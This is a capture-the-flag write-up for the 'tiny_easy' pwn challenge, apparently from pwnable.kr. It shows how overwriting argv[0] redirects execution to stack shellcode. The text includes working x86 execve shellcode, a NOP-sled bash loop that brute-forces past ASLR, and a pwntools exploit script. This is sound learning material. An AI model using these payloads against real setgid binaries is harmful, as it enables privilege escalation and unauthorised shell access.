*"I made a pretty difficult pwn task.
However I also made a dumb rookie mistake and made it too easy :(
This is based on real event :) enjoy."*

we get a 32 bit elf with corrupted section header size...
the binary have a `setgid` bit to `tiny_easy_pwn` and we can read the flag with this permissions. 
when we run it we get a segmentation fault. [Meaning](https://stackoverflow.com/questions/2346806/what-is-a-segmentation-fault) we accessed a memory that does not belongs to us. 

```asm
pop     eax
pop     edx
mov     edx, [edx]
call    edx
```
that's the disassembly. so we take the second parameter on the stack, then take it's value and call to it. I think that it takes the first string value from `argv`. let's check with `gdb`.

well `objdump` didn't successfully disassembled this binary... with `gdb` we stop at a crash.  
Ok I found on the internet that we could use `start` to only initialize the run and then we can single step.
![[Pasted image 20231110170631.png]]
I was right.
now the idea is to change `argv[0]` to the address we want to jump and boom, we get execution redirection. with that I can jump to the stack and then execute my shellcode.
the problem is that we don't know the stack addresses because of `aslr`.
```bash
[*] '/home/tiny_easy/tiny_easy'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```
nice :).

let's play with the code we have. if I call the `start` again then we will get the next value on the stack (because the RA was popped to `eax`). we will get to jump to the value of the pointer inside the stack (because of the last `mov`).

maybe there is no problem with the `aslr`?

I can brute force the stack addresses. like in passcode :)

## The Exploit
1. change `argv[0]` to an address on the stack
2. change `argv[1]` to a shellcode that opens a shell.
let's check this idea with `gdb`.
```python
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```
there is a weird behavior  that when calling `int 0x80` the shell doesn't popes up.

here is another shellcode that `setuid() execve(); exit();` 
```python
'\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80'
```
this one works fine. the only problem is that we don't need the `setuid`. this one is `execve()` and `exit` but it executes `/bin/ash`
```python
'\x31\xc0\x50\x68\x2f\x61\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80'
```
modified
```python
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80'
```
this is the final shellcode :)
`set {int}0xffffce44 = 0xffffce85` without `aslr`.
meaning we need to set `argv[0]` to `0xffffce85`

the problem is to set `argv[0]` to a value and debug this. maybe I can use a link?
`ln -s oldname newname` this works but the file gets added the `PWD` .
I tried to delete `PWD` it didn't helped.

let's try to debug exec -a 

```bash
(exec -a $'I\xce\xff\xff' ./tiny_easy $'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80')
```
this is the idea

`(exec -a 'false name' ./test b c)`
this idea works but the problem is that the address is not the same. let's disable `aslr`.

I can now try to run this program 2 million times :).
it's harder then it looks.
maybe it's better if I found something that doesn't includes messing with the stack addresses?

if I could write the code to the code segment that would be cool or to the GOT? I mean to a constant location.

well if the entire stack would be filled with `nops` and I would jump to the lower bytes of the stack then I will hit the shellcode.
the location of the shellcode is different if the name is shorter 
if the location of `argv[0]` is at `0xffffce45` then `argv[1]` will be at `0xffffce45 + length of argv[0]` 

Choose a multiple of 4 between 0xff800000 and of 0xfffffffc at random. then run the program until you get a shell.
```bash
 (exec -a $'I\xce\xff\xff' ./tiny_easy `python2 -c "print('\x90'* 0x10000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80')"`)
```
Ok now I know for sure that in `tiny_easy`  we must execute the shellcode from the stack.
because in `tiny` we have NX enabled :).

boom the loop I looked for: https://unix.stackexchange.com/questions/486180/construct-a-while-loop-around-a-command-throwing-a-segmentation-fault

```bash
#! /bin/bash

shellcode=`python2 -c "print('\x90' * 0x1f000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80')"`

shellcode_stack_address=$'I\xce\xff\xff'

  
  

(exec -a $shellcode_stack_address $1 $shellcode)

while [ $? -ge 128 ]

do

    (exec -a $shellcode_stack_address $1 $shellcode)

done
```
this is the code. This doesn't work... it did :)

## writeups
```python
 from pwn import *
 
 dic = {}
 dic["SHELLCODE"] = "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 
 while True:
     try:
         io = process(["\x11\x11\x88\xff"],executable="./tiny_easy",env=dic)
 
 
         io.sendline("ls")
 
         o = io.recv()
         print(o)
         if (len(o) > 0):
             io.interactive()
         exit()
     except Exception as e:
         print(e)

```
wow you could do it with python!
